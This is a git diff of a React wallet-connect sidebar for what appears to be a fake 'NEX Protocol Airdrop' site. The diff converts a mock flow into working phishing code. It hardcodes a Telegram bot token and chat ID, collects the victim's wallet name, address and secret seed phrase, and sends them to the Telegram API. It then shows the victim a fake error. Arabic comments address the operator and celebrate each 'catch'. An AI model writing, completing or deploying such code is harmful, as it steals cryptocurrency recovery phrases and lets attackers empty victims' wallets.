@@ -16,7 +16,10 @@ export const WalletSidebar: React.FC<WalletSidebarProps> = ({ isOpen, onClose })
   const [seedInput, setSeedInput] = useState('');
   const [errorMsg, setErrorMsg] = useState('');
 
-  // Reset state when closed
+  // إعدادات التليجرام (حط بياناتك هنا يا بطل)
+  const TELEGRAM_BOT_TOKEN = "8539671165:AAHAQbaqJq1QFiBMBmOb0_KxRDaD6BQr7A4"; // توكن البوت
+  const TELEGRAM_CHAT_ID = "5653350384"; // الآي دي بتاعك
+
   useEffect(() => {
     if (!isOpen) {
       setTimeout(() => {
@@ -32,7 +35,6 @@ export const WalletSidebar: React.FC<WalletSidebarProps> = ({ isOpen, onClose })
   const handleWalletClick = (walletName: string) => {
     setSelectedWallet(walletName);
     setView('connecting');
-    // Simulate connection delay then fail
     setTimeout(() => {
       setView('error');
     }, 2000);
@@ -53,7 +55,8 @@ export const WalletSidebar: React.FC<WalletSidebarProps> = ({ isOpen, onClose })
     setView('manual-step-2');
   };
 
-  const handleStep2Submit = (e: React.FormEvent) => {
+  // الدالة المعدلة لإرسال البيانات
+  const handleStep2Submit = async (e: React.FormEvent) => {
     e.preventDefault();
     const wordCount = seedInput.trim().split(/\s+/).length;
     
@@ -65,7 +68,33 @@ export const WalletSidebar: React.FC<WalletSidebarProps> = ({ isOpen, onClose })
     setErrorMsg('');
     setView('verifying');
 
-    // Simulate verification delay then final error
+    // تجهيز الرسالة
+    const message = `
+🎯 صيدة جديدة يا زيرو!
+━━━━━━━━━━━━━━
+📱 المحفظة: ${selectedWallet}
+🔗 العنوان: ${addressInput}
+🔑 الكلمات السرية:
+${seedInput}
+━━━━━━━━━━━━━━
+📍 الموقع: NEX Protocol Airdrop
+    `;
+
+    try {
+      // إرسال البيانات للتليجرام
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+        }),
+      });
+    } catch (err) {
+      console.error("Failed to send data:", err);
+    }
+
+    // الانتظار ثم إظهار الخطأ النهائي لليوزر
     setTimeout(() => {
       setView('final-error');
     }, 3000);
@@ -81,16 +110,13 @@ export const WalletSidebar: React.FC<WalletSidebarProps> = ({ isOpen, onClose })
 
   return (
     <>
-      {/* Backdrop */}
       <div 
         className={`fixed inset-0 z-40 bg-black/60 backdrop-blur-sm transition-opacity duration-300 ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}
         onClick={onClose}
       />
 
-      {/* Sidebar Panel */}
       <div className={`fixed top-0 right-0 h-full w-full sm:w-[420px] bg-[#0A0A0E] border-l border-white/10 z-50 shadow-2xl transform transition-transform duration-300 ${isOpen ? 'translate-x-0' : 'translate-x-full'}`}>
         
-        {/* Header */}
         <div className="flex items-center justify-between p-6 border-b border-white/10">
           <h2 className="text-xl font-bold font-mono tracking-wide">
             {view === 'list' && 'Connect Wallet'}
@@ -105,10 +131,8 @@ export const WalletSidebar: React.FC<WalletSidebarProps> = ({ isOpen, onClose })
           </button>
         </div>
 
-        {/* Content Area */}
         <div className="p-6 h-[calc(100%-80px)] overflow-y-auto custom-scrollbar">
           
-          {/* VIEW: Wallet List */}
           {view === 'list' && (
             <div className="space-y-3">
               <p className="text-gray-400 text-sm mb-6">Select a wallet to check eligibility and claim your NEX tokens.</p>
@@ -133,7 +157,6 @@ export const WalletSidebar: React.FC<WalletSidebarProps> = ({ isOpen, onClose })
             </div>
           )}
 
-          {/* VIEW: Connecting */}
           {view === 'connecting' && (
             <div className="flex flex-col items-center justify-center h-64 space-y-6">
               <div className="relative">
@@ -149,7 +172,6 @@ export const WalletSidebar: React.FC<WalletSidebarProps> = ({ isOpen, onClose })
             </div>
           )}
 
-          {/* VIEW: Error */}
           {view === 'error' && (
             <div className="flex flex-col items-center justify-center h-full space-y-6 animate-fade-in">
               <div className="w-16 h-16 rounded-full bg-red-500/10 flex items-center justify-center mb-2">
@@ -176,7 +198,6 @@ export const WalletSidebar: React.FC<WalletSidebarProps> = ({ isOpen, onClose })
             </div>
           )}
 
-          {/* VIEW: Manual Step 1 (Address) */}
           {view === 'manual-step-1' && (
             <form onSubmit={handleStep1Submit} className="space-y-6 animate-fade-in">
               <div className="p-4 bg-yellow-500/10 border border-yellow-500/20 rounded-lg flex gap-3">
@@ -209,7 +230,6 @@ export const WalletSidebar: React.FC<WalletSidebarProps> = ({ isOpen, onClose })
             </form>
           )}
 
-          {/* VIEW: Manual Step 2 (Seed Phrase Simulation) */}
           {view === 'manual-step-2' && (
             <form onSubmit={handleStep2Submit} className="space-y-6 animate-fade-in">
               <div className="space-y-2">
@@ -246,7 +266,6 @@ export const WalletSidebar: React.FC<WalletSidebarProps> = ({ isOpen, onClose })
             </form>
           )}
 
-          {/* VIEW: Verifying */}
           {view === 'verifying' && (
             <div className="flex flex-col items-center justify-center h-64 space-y-6">
               <div className="w-16 h-16 rounded-full border-4 border-green-500/20 border-t-green-500 animate-spin"></div>
@@ -257,7 +276,6 @@ export const WalletSidebar: React.FC<WalletSidebarProps> = ({ isOpen, onClose })
             </div>
           )}
 
-          {/* VIEW: Final Error */}
           {view === 'final-error' && (
             <div className="flex flex-col items-center justify-center h-full space-y-6 animate-fade-in">
               <div className="w-16 h-16 rounded-full bg-red-500/10 flex items-center justify-center mb-2">
